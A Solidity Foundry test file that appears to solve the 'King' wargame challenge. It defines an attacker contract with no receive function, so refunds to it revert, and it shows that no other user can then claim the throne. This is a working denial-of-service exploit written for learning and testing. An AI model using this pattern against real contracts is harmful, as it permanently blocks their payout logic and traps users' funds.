
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";
import {DeployKing} from "../script/DeployKing.s.sol";

contract KingTest is Test {

    King king;
    DeployKing deployer;

    address public user = makeAddr("user");

    function setUp() external {
        deployer = new DeployKing();
        king = deployer.run();
        vm.deal(user, 10 ether);
    }

    function testAttackerCanStayKingForever() external  {
        AttackerCanStayTheKingForever attackerContract = new AttackerCanStayTheKingForever(king);
        console.log("Attacker Contract Address: ", address(attackerContract));
        console.log("User Address: ", user);
        attackerContract.becomeKing{value: 1 ether}();
        console.log("Current King is: ", king._king());


        console.log("User Tries To Become the new King.");
        vm.startPrank(user);
        (bool success, ) = address(king).call{value: king.prize()}("");
        assertFalse(success, "Low Level Call Failed");
        console.log("it Failed!");
        vm.stopPrank();

        console.log("Current King is: ", king._king());
        assertEq(king._king(), address(attackerContract));
    }

}

contract AttackerCanStayTheKingForever {
    King king;

    constructor(King _king) {
        king = _king;
    }

    function becomeKing() external payable {
        (bool success, ) =  address(king).call{ value: king.prize() }("");
        require(success, "Low Level Call Failed");
    }
}